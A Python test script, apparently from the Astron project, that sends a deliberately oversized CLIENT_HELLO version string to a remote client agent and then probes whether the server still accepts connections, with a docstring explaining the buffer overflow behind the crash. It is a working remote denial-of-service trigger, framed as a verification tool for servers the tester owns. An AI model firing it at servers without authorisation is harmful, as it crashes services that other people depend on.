#!/usr/bin/env python3
"""Remote check for the Astron client-agent oversized CLIENT_HELLO crash.

Sends a CLIENT_HELLO whose version string is deliberately enormous to a
(client agent) server over the network, then checks whether that server still
accepts connections afterwards. Use this to verify whether a server you control
is affected by the Datagram::add_string() / add_blob() overflow.

Background
----------
The client agent compares the client's version string (from CLIENT_HELLO) with
its own version and, on a mismatch, echoes BOTH back to the client in a
"Client version mismatch: client=<...>, server=<...>" ejection message. With a
version string close to the 16-bit datagram limit, that message exceeds
DGSIZE_MAX. On a vulnerable build, check_add_length() truncated the length to
16 bits before the bounds check, so the following memcpy() wrote past the
datagram buffer and the process crashed. On a fixed build the overflow is
detected and the client is simply ejected with
CLIENT_DISCONNECT_OVERSIZED_DATAGRAM (106).

Notes
-----
* The version string is checked BEFORE the dc hash, so the dc hash value is
  irrelevant here; you do not need the server's real hash.
* A single client datagram is limited to 65535 bytes (16-bit framing). With the
  default CLIENT_HELLO overhead (2 + 4 + 2 bytes) the largest deliverable
  version string is 65527 bytes. A larger --version-size is clamped, with a
  warning. (Use --dsize-bytes 4 only if the target is built for 32-bit
  datagrams.)
* This is a denial-of-service style probe: on a vulnerable server it kills a
  client-agent worker.

Usage
-----
    python3 test/test_version_overflow_remote.py --host 203.0.113.10
    python3 test/test_version_overflow_remote.py --host play.example.com --port 7198
    python3 test/test_version_overflow_remote.py --host 10.0.0.5 --version-size 65527

Only run this against a server you own or are explicitly authorised to test.
"""
import argparse
import socket
import struct
import sys
import time

CLIENT_HELLO = 1
CLIENT_HELLO_RESP = 2
CLIENT_EJECT = 4

CLIENT_DISCONNECT_OVERSIZED_DATAGRAM = 106
CLIENT_DISCONNECT_BAD_VERSION = 124

MSG_NAMES = {
    CLIENT_HELLO_RESP: "CLIENT_HELLO_RESP",
    CLIENT_EJECT: "CLIENT_EJECT",
}


def dgsize_max(dsize_bytes):
    return (1 << (8 * dsize_bytes)) - 1


def build_hello(version_bytes, dsize_bytes, dc_hash):
    """Build a fully framed (outer length prefix included) CLIENT_HELLO."""
    fmt = "<H" if dsize_bytes == 2 else "<I"
    payload = (struct.pack("<H", CLIENT_HELLO)
               + struct.pack("<I", dc_hash)
               + struct.pack(fmt, len(version_bytes))
               + version_bytes)
    return struct.pack(fmt, len(payload)) + payload


def attempt(host, port, frame, timeout):
    """Connect, send one framed datagram, and read the reply until EOF/timeout.

    Returns (connected, reply_bytes, error).
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    chunks = []
    try:
        try:
            sock.connect((host, port))
        except OSError as exc:
            return False, b"", exc

        try:
            sock.sendall(frame)
            while True:
                try:
                    data = sock.recv(65536)
                except socket.timeout:
                    break
                if not data:
                    break
                chunks.append(data)
        except OSError as exc:
            return True, b"".join(chunks), exc
        return True, b"".join(chunks), None
    finally:
        sock.close()


def parse_reply(reply, dsize_bytes):
    """Parse an outer-framed client message; returns (msgtype, payload) or None."""
    if len(reply) < dsize_bytes:
        return None
    if dsize_bytes == 2:
        plen, = struct.unpack("<H", reply[:2])
        off = 2
    else:
        plen, = struct.unpack("<I", reply[:4])
        off = 4
    payload = reply[off:off + plen]
    if len(payload) < 2:
        return None
    msgtype, = struct.unpack("<H", payload[:2])
    return msgtype, payload


def describe(reply, dsize_bytes):
    parsed = parse_reply(reply, dsize_bytes)
    if parsed is None:
        return "no complete reply (%d byte(s) received)" % len(reply)
    msgtype, payload = parsed
    name = MSG_NAMES.get(msgtype, "msgtype %d" % msgtype)
    if msgtype == CLIENT_EJECT and len(payload) >= 6:
        reason, slen = struct.unpack("<HH", payload[2:6])
        text = payload[6:6 + slen].decode("latin-1", "replace")
        if len(text) > 160:
            text = text[:160] + "...<truncated>"
        return "%s (reason=%d): %s" % (name, reason, text)
    return name


def main():
    parser = argparse.ArgumentParser(
        description="Send an oversized CLIENT_HELLO version string to a remote "
                    "Astron client agent and report whether it survives.")
    parser.add_argument("--host", required=True,
                        help="Remote IP/hostname of the client agent to probe.")
    parser.add_argument("--port", type=int, default=6667,
                        help="Client agent TCP port (default: 6667).")
    parser.add_argument("--version-size", type=int, default=65550,
                        help="Version string length to send (default: 65550; "
                             "clamped to what the wire format can carry).")
    parser.add_argument("--dsize-bytes", type=int, choices=(2, 4), default=2,
                        help="Datagram length-field width used by the target "
                             "(2 for the standard build, 4 for 32-bit datagrams).")
    parser.add_argument("--dc-hash", type=lambda v: int(v, 0), default=0,
                        help="DC hash to send (irrelevant: the version is checked first).")
    parser.add_argument("--timeout", type=float, default=5.0,
                        help="Per-connection timeout in seconds (default: 5.0).")
    parser.add_argument("--skip-liveness", action="store_true",
                        help="Only send the oversized hello; do not probe for "
                             "liveness afterwards.")
    args = parser.parse_args()

    overhead = 2 + 4 + args.dsize_bytes  # msg type + dc hash + version length tag
    maximum = dgsize_max(args.dsize_bytes) - overhead
    size = args.version_size
    if size > maximum:
        print("warning: a %d-byte version string cannot fit in a single client "
              "datagram with %d-byte framing (max %d bytes); using %d instead."
              % (size, args.dsize_bytes, maximum, maximum))
        size = maximum
    if size < 0:
        print("error: --version-size must be >= 0")
        return 2

    target = "%s:%d" % (args.host, args.port)
    print("Target: %s" % target)
    print("Sending CLIENT_HELLO with a %d-byte version string (framed size %d bytes)..."
          % (size, overhead + size))

    frame = build_hello(b"A" * size, args.dsize_bytes, args.dc_hash)
    connected, reply, err = attempt(args.host, args.port, frame, args.timeout)
    if not connected:
        print("FAIL: could not connect to %s: %s" % (target, err))
        return 2
    print("  oversized hello -> %s%s"
          % (describe(reply, args.dsize_bytes),
             "" if err is None else "  [%s]" % err))

    if args.skip_liveness:
        return 0

    time.sleep(0.5)
    print("Probing whether %s still accepts connections..." % target)

    probe_frame = build_hello(b"astron-overflow-remote-probe",
                              args.dsize_bytes, args.dc_hash)
    alive, alive_reply, alive_err = attempt(args.host, args.port, probe_frame,
                                            args.timeout)

    if not alive:
        print("VERDICT: FAIL - the server is NOT accepting new connections after the "
              "oversized CLIENT_HELLO.")
        print("         It most likely crashed in Datagram::add_string() "
              "(probe error: %s)." % alive_err)
        return 1

    print("  liveness probe  -> %s%s"
          % (describe(alive_reply, args.dsize_bytes),
             "" if alive_err is None else "  [%s]" % alive_err))
    print("VERDICT: PASS - the server survived and is still accepting connections.")

    parsed = parse_reply(reply, args.dsize_bytes)
    if parsed is not None and parsed[0] == CLIENT_EJECT and len(parsed[1]) >= 4:
        reason, = struct.unpack("<H", parsed[1][2:4])
        if reason == CLIENT_DISCONNECT_OVERSIZED_DATAGRAM:
            print("         The oversized hello was cleanly rejected with "
                  "CLIENT_DISCONNECT_OVERSIZED_DATAGRAM (106): the overflow is guarded.")
        elif reason == CLIENT_DISCONNECT_BAD_VERSION:
            print("         The oversized hello was rejected with BAD_VERSION (124) "
                  "without overflowing; the server looks patched "
                  "(or uses 32-bit datagrams).")
    return 0


if __name__ == "__main__":
    sys.exit(main())
